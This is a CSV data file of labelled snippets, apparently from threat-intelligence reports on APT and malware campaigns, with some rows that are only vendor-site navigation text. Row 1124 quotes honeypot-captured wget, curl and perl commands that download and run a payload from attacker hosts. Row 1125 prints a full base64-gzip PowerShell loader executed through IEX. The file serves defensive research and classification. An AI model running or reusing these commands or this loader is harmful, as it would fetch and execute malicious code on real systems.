ID,SPLIT,description,long_pat_train_label
1123,Long_Train,"target networks through various means of intrusion: watering hole websites, vulnerability scans of network services on the internet, and brute-force/dictionary login attempts. The actor’s post-compromise toolkit suggests that the group is looking for email data, files, and database servers on compromised target systems. Figure 1. Leafminer targeting organizations in Middle East region Leafminer’s arsenal During our investigation, there was a breakthrough discovery that helped connect Leafminer to a number of attacks observed on systems in the Middle East and identify the toolkit used in the group’s efforts of intrusion, lateral movement, and exfiltration. The download URL for a malware payload used in one of the attacks lead to the identification of a compromised web server on the domain e-qht.az that had been used to distribute Leafminer’s arsenal of malware, payloads, and tools within the group and make them available for download from victim machines. As of early June 2018, the server hosted 112 files in a subdirectory that could be accessed through a public web shell planted by the attackers. In addition to malware and tools, the served files also included uploads of log files seemingly originating from vulnerability scans and post-compromise tools. The web shell is",1
1124,Long_Train,"can also affect Windows-based environments and even Android devices. The threat actors in this recent activity compromised an FTP (File Transfer Protocol) server of a Japanese art institution, as well as a Bangladeshi government site over a vulnerability on Dovecot mail server . They then used two compromised servers and linked them to a high availability cluster to host an IRC bouncer, which was used to command and control the emerging botnet. Aside from finding several exploit files that allowed us to understand how the initial exploit on the first server worked, we also found configuration files of the hackers’ toolset that allowed them to target organizations through DoS and SSH brute force, using so-called “class files.” Moreover, this suggests that the threat actors were building a botnet that can be used for cybercriminal purposes. The operation particularly caught our attention after various sensors of our honeypots started to capture new injected commands: Source Command 107.1.153.75 uname -a; wget hxxp://54[.]37[.]72[.]170/n3; curl -O hxxp://54[.]37[.]72[.]170/n3; perl n3; rm -rf n3; rm -rf n3.* 195.154.43.102 uname -a; wget ftp://museum:museum04@153[.]122[.]156[.]232/Mail/n3; rm -rf n3; rm -rf n3.* 218.25.74.221 uname -a;",0
1125,Long_Train,"setup was mimicking a CobaltStrike[ 5 ] setup from a redteam blog[ 4 ]. Here we have a pretty obvious suspicious hta file. The base64 data looks instantly familiar so let’s decode out the next layer: $s = New-Object IO.MemoryStream (,[ Convert ]:: FromBase64String ( ""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"" )); IEX ( New-Object IO.StreamReader ( New-Object IO.Compression.GzipStream ( $s ,[ IO.Compression. CompressionMode ]:: Decompress ))) . ReadToEnd (); Looks like this code will decode the base64 chunk and then GZIP decompress it before executing it as another layer of powershell code. >>> a = ""H4sIAAAAAAAAAK1Xa2/iShL9HH6FP0QCNISXCYGRRhobMJjBvDGP3Chqu9umof2I3caQO/Pft2wgN7OT2R1pF8mi3a6qPnX6dLk8I/xuxgNqcs3DRLjTSRBSzxWqmcxt21O58EX4ms1YkWvyZDoZPNuEP/uBZz4jjAMShsLfmZsxCpAj5G4PKHh2PBwxUhDSm8SQ4Cgg+ZubzE06Fbkhssizizg9kGeH8K2HQ1go9yj5fttzEHWfPn9uRUFAXH6+L3YJl8KQOAajJMzlhe/CcksCcjcydsTkwt/C7XOxyzwDsYvZqYXMLSQkuTh5NvBMlGRQnPmM8lz2r7+y+ce7ylOx8xIhFuays1PIiVPEjGXzwo98suD85JNcVqNm4IWexYtL6orV4iJFP0zBa2fs2fwlM9tHkMfvk0yinn1yWRiOgRvpzGG2IDwm6z0+PQlf39BMI5dThxRVl5PA82ckOFCThMUecjEjU2KBWzaE7XPtbB5ABIRHgStcsYDfwduT3K0bMVaAuI9/GvcpNyTxldw/dcq9dwKrMQ/yhYsm/oQOLdXNORyk8wv6d+LKw+8XgeUzPzIfSBUTRmzEyTMHft9pNXNz85gOCeSTG3shTf2+COWCoAEIxL3glGznPIhI/umf/Tkve/UMC78NVLl6XXzO23PG8UV41D2KnzI3+cxFPcn8sxFRhkmQPP/9aWgTi7qkfXKRQ82r4HMf7RmxGEn5KF7NhoAzl708ILh9YSebEPr4q1vHofzNVz6Dk0zY9xBQgSTyP4M572Euq7oacYC/8z3I9NaCY0au1pejdbquntwnWm4xFIYFYRzBOTcLwowgRnBBkNyQXh5JEffSYfYfuFrEODVRyK/hnvIfUHpZuuW5cGIiE3YXaJjPfGJSxBJWCkKPYiKfZtS+Qsh+yEkLMQZHDiIdYE9gJuFixhPNBLjw7/rIF2eEq47PiAPWaRVSGLKh5lxOVCo3ZBOc/Q+wr+fkfCgSrq4kvQMNApgxjxcEnQYc6lq28Ivw/jd4P5eYn2C2AnLZyFx6EB/lE0+OS2ppJi+XL29cpswFHFhTAs+RUUjqtVlaxnLZ0oj2JfitVZdpuL+nFTWGS4NrQUXVaz/gb/1dr6SZrXDcVRoSje3YbAwl06INpb8Cuwktqw0JtwaTHlXi3vSbhGWYs9e0YtsSHu/GHWcwVEO5colz9jdrtd6qLIlibSSW95j0E/u9hIcOjY8DGEOxHg1k8CurrNNvTY1lVdksWa9UU7bW0gtn9doGo+49w5Ls4SqLkD715j3TkUslXbOaK72CV3rVruuu45aaK3+bJKqEx5OuTJE9nC6W9EGaSNKiInt6zbGOh5JeF2UDeJghSWqt1elswfrzBZO9emURjSAuCL8dV6RjCWKjQ3OuOzaXt9uHUnOpxNKnThx3JKndK22tTVlW3ft6zLyXcEVXVuKreNOZQjTrjA/ZeKpDbF6x7BbEPsTSARDeH8WZCDb+fgKxRm4/wVhXD6VSqXFArlLZrPr3g7kWaafaceAOQ7QsR8aSRQPHf5U6nWWPS5uguXhlg4623tWd6jzs7l6m0ZH3yuN4H5bDcZXR+wZurD516+1KZ2J1xwqZaKGn+ZVTXX4YV6SOsltX9Ri3PRt39RpuNT3crYSDrhKb3aO/ripltGxGA3Gbzn8Tt9xoHbdmTwY8wy3usoNBmzVjGT+Y83I82O3Db7TxMhI7Ta1Vq7UnvryuDpnZm/B5V4k2or7dVBd1tatHA12fD+D/YlsBW9UQh+URlXdGdcogzyNe6icyu4f78rDF+mzj6KfNSgX/bRn3pPrg1PzI9vB+3ekymZv6hmOCH66jlRSq3SnEOgL+BcTVXyEmnywxM9xJXe1UDsRhodHtHIazWqy2tiu0vN8bIn5VO/cLtb2OtNfQ1nt9fwP4cashDnbSg9rrV0e7zhHGvgrcoerCnlb1Hao2hi27jWP1/ridGI2aPWnV+5NhtG6KS+243/VfXpaKqIyW7tror6bWRPYagyXVQadoL3uSDGrp2pIEMtGr27WvjBnocB6hxhieyFVdmVMCOpUkMJITrUK9cmmq1d68S2NTjmsrCRN9HX+ifskqlbTXRaTN7dNgpwHeTk2byP6LfwiSapTWlgN6V1l+16RoKAi3iEHFgUbj+ppQvEC5tAtjjyYeudzHHe6eBC5h0P1Bf3gtrhJjnpk0OL/pNKDdOjdBT/ASWcBQrH44ygtvhtDVnHMyIstKm4BLhtde6Gr4+fMG0rvU8qS4FgfEtfm2IJSPYrlcTv5r5Xzmz2lpef4p9xaukDRB75C8X4mlK13ZDyLXIf/HDfhp0f9ObUJe2ke9UZcC+pivfCb7NZNRLeHdfEhf4SuBvAiNfNIbhhwF/G7nGfBJkb4jc7coL6idlXCLhB/CHaQnhWIVvisCO0pemML5M+m7ECN6dvwuTIlJoM2963sGvAkJ9D1J6DRIYgxz/wLxG+OOdw0AAA=="" >>> b = base64 . b64decode ( a ) >>> b [: 100 ] ' \x1f\x8b\x08\x00\x00\x00\x00\x00\x00\x00\xad Wko \xe2 J \x12\xfd\x1c ~ \x85 ?D \x02 4 \x84\x97\t\x81\x91 F \x1a\x1b 0 \x98\xc1\xbc 1 \x8f\xdc (j",0
1126,Long_Train,"group that use mobile malware to siphon off money from account holders of South Korean banks. They are able to transfer up to US$1,600 worth of local currency from victims’ accounts every single day since 2013. This investigation is the result of our continuous monitoring of the threat landscape. We are always on the lookout for new threats, and the Chinese underground is",0
1127,Long_Train,knowing the victim’s SID”. From this is it is clear that the information has been,0
1128,Long_Train,Roblox TMX Group Contact Sales Discover our latest Webinars and Workshops View Webinars Unlocking the Cloud Operating Model Read whitepaper Company Company Company About Us Jobs Our Principles Tao of HashiCorp Blog Press Contact Us Events HashiConf Webinars Workshops View all events We're hiring Join us to build industry-leading open source tools and enterprise products View all open positions Announcing the HashiCorp Store Visit the Store Partners Partners Partners Ecosystem Resellers & System Integrators Training Partners Technology Partners Cloud Partners Partner Portal Product Integrations Cloud Integrations Technology Integrations Find a partner Become a partner Unlocking the Cloud Operating Model with Microsoft Azure Learn More Webinar: Secure GitOps Workflows with GitHub Actions and HashiCorp Vault Register Now Learn Learn Learn Product Guides Certifications Resource Library Blog Training Docs Terraform Vault Consul Nomad Vagrant Packer,0
1129,Long_Train,Yomi Email Protection Services IRT (Incident Response Team) Managed Advanced Threat Protection KickBack Attack After Attack Technologies Threat intelligence Kanwa Services Wi-Fi Infrastructure Assessment Threat Hunting Blog Home Downloads About us Contacts Cyber-Espionage Campaign Targeting the Naval Industry (“MartyMcFly”) 10/17/2018 Background During the last week Yoroi CERT’s analysts uncovered several attacks targeting the italian naval and defence industry . The attacker used email as known propagation vector in order to infect victims by sending a special crafted xls file. The identified attack properties triggered internal defcon escalation in order to assess the threat magnitude and eventually special malware analyses according to the threat. The suspicious emails have been intercepted between 9th and 15th,0
1130,Long_Train,"revolve around a series of subjects, including various cryptocurrencies, cryptocurrency exchanges, and political events. Based on various information witnessed within this dropper, Unit 42 has dubbed this malware family CARROTBAT. CARROTBAT was initially discovered in an attack on December 2017. This attack was made against a British government agency using the SYSCON malware family. SYSCON is a simple remote access Trojan (RAT) that uses the file transfer protocol (FTP) for network communications. While there is no evidence that this attack against a British government agency made use of the CARROTBAT dropper, we found overlaps within this attack’s infrastructure that ultimately lead us to CARROTBAT’s initial discovery, as well as other ties between these two malware families. In total, 29 unique CARROTBAT samples have been identified to date, containing a total of 12 confirmed unique decoy documents. These samples began appearing in March of this year, with the majority of activity taking place within the past 3 months. The payloads vary, as earlier instances delivered SYSCON, while newer instances are delivering the previously reported OceanSalt malware family. CARROTBAT and their associated payloads constitute a campaign that we are dubbing ‘Fractured Block’. Initial Attack On December 13, 2017, a",1
1131,Long_Train,Working Featured Solutions MVISION Unified Cloud Edge Cloud Security Endpoint Protection Machine Learning & AI Industries Financial Services Healthcare Public Sector Explore Our Portfolio Data Protection Network Security Security Management Security Operations Server Security Web Security All Solutions Products,0
1132,Long_Train,"confidential information from specific targets. Toward the end of 2015, we started seeing a new component being deployed by the group: a downloader for the main Sednit backdoor, Xagent. Kaspersky mentioned this component for the first time in 2017 in their APT trend report and recently wrote an article where they quickly described it under the name Zebrocy. This new component is a family of malware, comprising downloaders and backdoors written in Delphi and AutoIt . These components play the same role in the Sednit ecosystem as Seduploader — that of first-stage malware. Victims we have seen targeted by Zebrocy are located in Azerbaijan, Bosnia and Herzegovina, Egypt, Georgia, Iran, Kazakhstan, Korea, Kyrgyzstan, Russia, Saudi Arabia, Serbia, Switzerland, Tajikistan, Turkey, Turkmenistan, Ukraine, Uruguay and Zimbabwe. These targets include embassies, ministries of foreign affairs, and diplomats. The Zebrocy family consists of three components. In the order of deployment these are a Delphi downloader, an AutoIt downloader and a Delphi backdoor. Figure 1 shows the relationship between these components. In this article we describe this family and how it can coexist with the older Seduploader reconnaissance tools. We will talk about some similarities to and differences from Downdelph at the end. Figure 1: The Sednit ecosystem Figure 1 shows the attack methods and active malware used by Sednit. Email attachments are the main entry point to the Sednit ecosystem. DealersChoice is still being used, as research from Palo Alto Networks mentioned in this",1
1133,Long_Train,"OpenSSH. In the white paper, “The Dark Side of the ForSSHe”, they release analysis of 21 malware families to improve the prevention, detection and remediation of such threats Marc-Etienne M.Léveillé 5 Dec 2018 - 02:57PM Share ESET researchers discovered a set of previously undocumented Linux malware families based on OpenSSH. In the white paper, “The Dark Side of the ForSSHe”, they release analysis of 21 malware families to improve the prevention, detection and remediation of such threats SSH, short for Secure SHell, is a network protocol to connect computers and devices remotely over an encrypted network link. It is generally used to manage Linux servers using a text-mode console. SSH is the most common way for system administrators to manage virtual, cloud, or dedicated, rented Linux servers. The de facto implementation, bundled in almost all Linux distributions, is the portable version of OpenSSH . A popular method used by",0
1134,Long_Train,"MANAGE & AUTOMATE Easily monitor physical and virtual nodes through a single pane of glass Fabric Management and Automation DETECT & RESPOND Quickly access real-time network data to accelerate threat investigation Gigamon ThreatINSIGHT Get Started with Visibility The market-leading full-stack visibility solution to access and aggregate network data from a single, integrated platform. LEARN MORE SOLUTIONS FOR Network Operations Security Operations Cloud Operations Service Providers I WANT TO... Improve Performance Optimize Network Change Send Traffic to the Right Tools Improve On-Premises Security Secure the Public Cloud Accelerate Threat Response INDUSTRY Federal Financial Services Gigamon ThreatINSIGHT Accelerate threat detection and response A Thriving Partner Ecosystem Gigamon reseller and integration partners design, implement and optimize best-of-breed and validated joint solutions. FIND A PARTNER Technology Partners Reseller Partners Support and Professional Services Partners Partner Locator NOT A PARTNER? Become a Partner ALREADY A PARTNER? Partner Portal Login Metadata Empowered Partner Program Deliver the power of metadata to your customers. Proven Support and Services Our global support team is commited to creating experiences of unmatched quality, scalability and efficiency. MY GIGAMON OVERVIEW Support and Services Policies Warranty GET SUPPORT Contact Support Education Services Professional Services COMMUNITY Discussion Forum Collaboration Groups All Content Customer Success",0
1135,Long_Train,"Faster View all solutions Infrastructure Initiatives: Environment Segmentation Critical Application Ring-Fencing Hybrid Cloud Security View all Infrastructure Initiatives Industries Finance Healthcare Legal Other Industries Compliance and Risk Frameworks: Zero Trust Security PCI DSS Compliance SWIFT Compliance Services Professional Services Support Technical Account Manager Cyber Security Analyst Training and Certification Partners Partner Program Partner Log-In Technology Partners MSSP Program Company Leadership Awards & Recognition Contact Us Resources Resources Center Comparison Guides Micro-Segmentation Hub Blog Press Releases Labs Labs Blog Infection Monkey Botnet Encyclopedia Cyber Threat Intelligence Research & Academic Get a Demo Search Menu Menu Bread and butter attacks Written by Daniel Goldberg and Ofri Ziv on November 29, 2018 2 Comments Butter is an attack campaign that has been known to us for several years. Unlike the dozens of short-lived, mass attacks monitored in our network of sensors (GGSN), Butter originates from a very limited number of attack sources and keeps them alive without being caught due to its low and slow operation. In July of this year, Butter released a new payload that has gone undetected by many security products and has convinced us to release this post. Butter executes a brute force SSH attack and on every breached Linux machine leaves a backdoor user named butter, together with a Trojan registered as a service. Since we first discovered Butter, we’ve",1
1136,Long_Train,"available in: 日本語 ( Japanese ) Introduction Little has been published on the threat actors responsible for Operation Ke3chang since the report was released more than two years ago. However, Unit 42 has recently discovered the actors have continued to evolve their custom malware arsenal. We’ve discovered a new malware family we’ve named TidePool. It has strong behavioral ties to Ke3chang and is being used in an ongoing attack campaign against Indian embassy personnel worldwide. This targeting is also consistent with previous attacker TTPs; Ke3chang historically targeted the Ministry of Affairs, and also conducted several prior campaigns against India. Though we don’t have comprehensive targeting information, the spear phishing emails we found targeted several Indian embassies in different countries. One decoy references an annual report filed by over 30 Indian embassies across the globe. The sender addresses of the phishing emails spoof real people with ties",1
1137,Long_Train,"on the same type of preventive measures as all other machines, since they are a specific type",0
1138,Long_Train,"Read Threat Intelligence Subscribe Seedworm: Group Compromises Government Agencies, Oil & Gas, NGOs, Telecoms, and IT Firms Group remains highly active with more than 130 victims in 30 organizations hit since September 2018. Symantec researchers have uncovered extensive insights into a cyber espionage group behind a recent series of cyber attacks designed to gather intelligence on targets spread primarily across the Middle East as well as in Europe and North America. The group, which we call Seedworm (aka MuddyWater), has been operating since at least 2017, with its most recent activity observed in December 2018. Analysts in our DeepSight Managed Adversary and Threat Intelligence (MATI) team have found a new backdoor, Backdoor.Powemuddy",0
1139,Long_Train,"use of three command sources: Google Cloud Messaging (GCM) service – used to send small messages in JSON format to a mobile device via Google servers ; malicious C&C server; incoming SMS messages. This ‘versatility’ was present in the first version of Rotexy and has been a feature of all the family’s subsequent representatives. During our research we also arrived at the conclusion that this Trojan evolved from an SMS spyware Trojan that was first spotted in October 2014. Back then it was detected as Trojan-Spy.AndroidOS.SmsThief, but later versions were assigned to another family ­– Trojan-Banker.AndroidOS.Rotexy. The modern version of Rotexy combines the functions of a banking Trojan and ransomware. It spreads under the name AvitoPay.apk (or similar) and downloads from websites with names like youla9d6h.tk, prodam8n9.tk, prodamfkz.ml, avitoe0ys.tk, etc. These website names are generated according to a clear algorithm: the first few letters are suggestive of popular classified ad services, followed by a random string of characters, followed by a two-letter top-level domain. But before we go into the details of what the latest version of Rotexy can do and why it’s distinctive, we would like to give a summary of the path the Trojan has taken since 2014 up to the present day.",1
1140,Long_Train,"PowerShower , RemoteTemplates This post is also available in: 日本語 ( Japanese ) The Inception attackers have been active since at least 2014 and have been documented previously by both Blue Coat and Symantec ; historical attacks used custom malware for a variety of platforms, and targeting a range of industries, primarily in Russia, but also around the world. This blog describes attacks against European targets observed in October 2018, using CVE-2017-11882 and a new PowerShell backdoor we’re calling POWERSHOWER due to the attention to detail in terms of cleaning up after itself, along with the malware being written in PowerShell. Unit 42 has previously observed attacks from the group in 2017 against government targets in Europe,",1
1141,Long_Train,"malware in the victim’s %temp% directory. Our analysis of this malware shows that it belongs to Hussarini , also known as Sarhust , a backdoor family that has been used actively in APT attacks targeting countries in the ASEAN region since 2014. According to reports, the Philippines is the most exposed country in ASEAN to the cyberattacks known as advanced persistent threats, or APTs. After several massive data breaches in 2016, the Philippines started to invest in beefing up their defences against cyberattacks. In spite of these investments, however, the Philippines is still among the most prone countries to be targeted by these sorts of APT attacks. Exploit Document Our analysis begins with the exploit document named “Draft PH-US Dialogue on Cyber Security.doc” that takes advantage of the CVE-2017-11882 vulnerability. Upon successful exploitation, the malicious document file drops two files in the %Temp% directory. · Outllib.dll ·",1
1142,Long_Train,Working Featured Solutions MVISION Unified Cloud Edge Cloud Security Endpoint Protection Machine Learning & AI Industries Financial Services Healthcare Public Sector Explore Our Portfolio Data Protection Network Security Security Management Security Operations Server Security Web Security All Solutions Products,0
1143,Long_Train,"written in PHP , intended to handle the administration of MySQL over the web. This tool is fairly popular among web developers due to the convenience of operating a database via a web browser. On the other hand, the use of these type of tools leads the front-end of a server to be publicly exposed, and in particular to phpMyAdmin , with a lack of protection against brute-forcing attempts. This blog will cover how the Muhstik malware has been using phpMyAdmin scanners in its newer variants in order to extend the spectrum of its vulnerable devices discovery and acquisition. Another recent IoT malware campaign that targeted phpMyAdmin servers was Operation Prowli , however, it is not very common to see these type of botnets targeting web servers. We will also disclose the relationship between Muhstik’s phpMyAdmin Scanner and an open-source",0
1144,Long_Train,"malicious Ukrainian bank documents, which contained a macro that downloaded a FELIXROOT payload, being distributed to targets. FireEye recently observed the same FELIXROOT backdoor being distributed as part of a newer campaign. This time, weaponized lure documents claiming to contain seminar information on environmental protection were observed exploiting known Microsoft Office vulnerabilities CVE-2017-0199 and CVE-2017-11882 to drop and execute the backdoor binary on the victim’s machine. Figure 1 shows the attack overview. Figure 1: Attack overview The malware is distributed via Russian-language documents (Figure 2) that are weaponized with known Microsoft Office vulnerabilities. In this campaign, we observed threat actors exploiting CVE-2017-0199 and CVE-2017-11882 to distribute malware. The malicious document used is named “Seminar.rtf”. It exploits CVE-2017-0199 to download the second stage payload from 193.23.181.151 (Figure",1
1145,Long_Train,"with those previously attributed to the group but it seems that this time we are witnessing significant changes that may hint at a new evolution from the group. The samples we found indicate once again that the group is aware of the various studies made surrounding its activities and is working to make it difficult for the various research bodies to identify its attacks and attribute them to it. In our research we’ve compared and analyzed these newly discovered samples and IOCs, alongside samples previously observed by other researchers in order to create a better, more complete and up-to-date picture of the first stage tactics, techniques and procedures used by the threat group. Where it All Began The cyber-attack on the Winter Olympic Games 2018 in South Korea disrupted the IT infrastructure of the event only for a short period of time, but grabbed a lot of headlines in the media, as the",1
1146,Long_Train,"this attack. Clearly, OilRig incorporates a testing component within their development process, as we have previously observed OilRig performing testing activities on their delivery documents and their TwoFace webshells . This testing component often involves making small modifications to their delivery documents and submitting these files to online public anti-virus scanning tools to determine the maliciousness of a submitted file and to figure out how to evade these detections. Providing a free and quick anti-virus testing service, using these online scanners aids an attacker in understanding which anti-virus engine detects their malware, thus giving the attacker a metaphorical “quality assurance service.” To determine OilRig’s operational tempo, we compared the creation times of the files created during testing, the creation time of the delivery document and the time in which the spear-phishing email was sent in the attack. We found that OilRig began its testing activities just under 6 days prior to the targeted attack and performed three waves of testing attempts on August 20th, 21 st , and 26th. The tester created the final test file less than 8 hours before the creation time of a delivery document, which was then delivered via a spear-phishing email 20 minutes later. OilRig’s Testing Activities While investigating recent attacks performed by the threat actor group OilRig using their new Bondupdater version , Unit 42 researchers searched for additional Microsoft Office documents used by OilRig hoping to locate additional malware being used in other attacks during the same time period. We focused on the functionality and pivoting off the original OilRig Microsoft documents found during our recent investigation. Unit 42 researchers found 11 additional samples that were submitted across several public anti-virus testing sites, as seen in Table 1. These samples appeared to have been created by OilRig during their development and testing activities, all of which share many similarities with the delivery document used in the recent OilRig attack against a Middle Eastern government, N56.15.doc (7cbad6b3f505a199d6766a86b41ed23786bbb99dab9cae6c18936afdc2512f00) that we have also",1
1147,Long_Train,"accomplish their objectives. In August 2018, Unit 42 observed OilRig targeting a government organization using spear-phishing emails to deliver an updated version of a Trojan known as BONDUPDATER. BONDUPDATER is a PowerShell-based Trojan first discovered by FireEye in mid-November 2017 , when OilRig targeted a different Middle Eastern governmental organization. The BONDUPDATER Trojan contains basic backdoor functionality, allowing threat actors to upload and download files, as well as the ability to execute commands. BONDUPDATER, like other OilRig tools, uses DNS tunneling to communicate with its C2 server. During the past month, Unit 42 observed several attacks against a Middle Eastern government leveraging an updated version of the BONDUPDATER malware, which now includes the ability to use TXT records within its DNS tunneling protocol for its C2 communications. A New Series of Attacks In mid-August, the Oilrig threat group sent what appeared to be a highly targeted phishing email to a high-ranking office in a Middle Eastern nation. The email had no subject and what initially drew our attention to this attack was the content of the spear phishing email. Figure 1. Spear phishing email sent by the Oilrig threat group Attached to the",1
1148,Long_Train,Working Featured Solutions MVISION Unified Cloud Edge Cloud Security Endpoint Protection Machine Learning & AI Industries Financial Services Healthcare Public Sector Explore Our Portfolio Data Protection Network Security Security Management Security Operations Server Security Web Security All Solutions Products,0
